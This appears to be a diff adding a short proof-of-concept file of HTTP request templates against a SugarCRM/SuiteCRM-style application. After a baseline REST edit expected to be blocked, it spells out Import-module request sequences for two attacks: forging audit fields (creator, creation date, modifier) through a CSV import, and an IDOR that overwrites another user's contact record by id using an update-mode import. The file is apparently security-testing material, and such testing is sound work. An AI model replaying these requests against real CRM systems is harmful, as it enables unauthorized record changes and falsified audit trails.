@@ -1,0 +1,14 @@
+### baseline: L's normal edit attempt on V (legacy REST set_entry, expect blocked)
+POST /service/v4_1/rest.php  method=set_entry  rest_data=["<L sid>","Contacts",[{"name":"id","value":"a869ea2e-694f-43a0-a484-02a9b7b71767"},{"name":"last_name","value":"ShouldNotStick"}]]
+
+### (a) audit-forgery import -- Confirm (multipart upload)
+POST /index.php  module=Import&action=Confirm&import_module=Contacts  + multipart file field userfile=<csv: last_name,created_by,date_entered,modified_user_id>
+
+### (a) audit-forgery import -- Step4 (runs Importer::import())
+POST /index.php  module=Import&action=Step4&import_module=Contacts&tmp_file=upload://IMPORT_Contact_2271f820-bee1-4b26-950c-7f1025e266cc&columncount=4&colnum_0=last_name&colnum_1=created_by&colnum_2=date_entered&colnum_3=modified_user_id
+
+### (b) update-by-id IDOR import -- Confirm (multipart upload)
+POST /index.php  module=Import&action=Confirm&import_module=Contacts  + multipart file field userfile=<csv: id,last_name>
+
+### (b) update-by-id IDOR import -- Step4 (runs Importer::import(), import_type=update)
+POST /index.php  module=Import&action=Step4&import_module=Contacts&tmp_file=upload://IMPORT_Contact_2271f820-bee1-4b26-950c-7f1025e266cc&columncount=2&colnum_0=id&colnum_1=last_name&import_type=update
